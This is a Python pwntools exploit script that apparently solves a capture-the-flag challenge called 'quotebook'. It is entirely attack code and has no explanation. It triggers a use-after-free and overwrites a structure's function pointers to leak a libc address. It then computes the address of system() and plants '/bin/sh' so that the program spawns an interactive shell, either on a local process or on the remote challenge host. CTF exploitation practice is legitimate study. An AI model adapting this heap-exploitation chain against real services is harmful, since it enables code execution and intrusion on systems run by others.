#!/usr/bin/python
import pwn
import os

remote = False

if remote:
    libc = pwn.ELF("./libc.so.6")
    s = pwn.remote("challs.dvc.tf", 2222)
else:
    libc = pwn.ELF("/usr/lib/libc.so.6")
    s = pwn.process("./quotebook")

def insert_dummy_quote(s):
    s.sendline("2")
    s.recv()
    s.sendline("1")
    s.recv()
    s.sendline("1")
    s.recv()
    s.sendline("a")
    s.recv()
    s.sendline("a")
    s.recv()

def del_quote(idx):
    s.sendline("5")
    s.recv()
    s.sendline("%d" % idx)
    print(s.recvuntil('number >'))

s.recv()
for i in range(3):
    insert_dummy_quote(s)

print("Deleting quotes")
del_quote(1)
del_quote(2)

s.recv()
print("List quotes")
s.sendline("1")
print(s.recvuntil('number > '))

# Craft UAF with title overwriting first quote_t structure
s.sendline("2")
print(s.recvuntil('size > '))
# title size
s.sendline("1")
print(s.recvuntil(' size > '))
# content size
s.sendline("48")
s.recvuntil('Title > ')

#### Craft structure to leak libc ###
# Pack content and content size (puts addr in PLT)
buf = pwn.pack(0x4040c0, 64) + pwn.pack(1, 64)
# Pack title addr and size (printf addr in PLT)
buf += pwn.pack(0x404030, 64) + pwn.pack(8, 64)
# Set function pointers
buf += pwn.pack(0x401236, 64) + pwn.pack(0x401294, 64)

# send title
s.sendline("a")
print(str(s.recvuntil('Content > '), 'ascii'))
# send content
s.sendline(buf)
print(str(s.recvuntil('Choice number > '), 'ascii'))

# Trigger UAF by displaying first quote (which contains our crafted quote_t)
s.sendline("3")
print(s.recv())
s.sendline("1")

# Compute system() address
leak = s.recvline()
puts_leak = leak[4:4+6]
addr = pwn.unpack(puts_leak, len(puts_leak)*8)
libc_base = addr - libc.symbols["printf"]
system_addr = libc_base + libc.symbols["system"]
print("%x" % system_addr)

# Edit the second quote so we can control first's quote buf
s.sendline("4")
s.recv()
s.sendline("2")
# Craft our content buffer
b = b"/bin/sh\x00" + pwn.pack(1, 64)
# Padding to reach function pointers
b += b"A"* 16
b += pwn.pack(system_addr, 64) * 2
s.sendline(b)
s.recvuntil('Choice number > ')

# Edit the first quote to trigger system()
s.sendline("4")
s.recvuntil('Quote number > ')
s.sendline("1")
# Get the shell
s.interactive()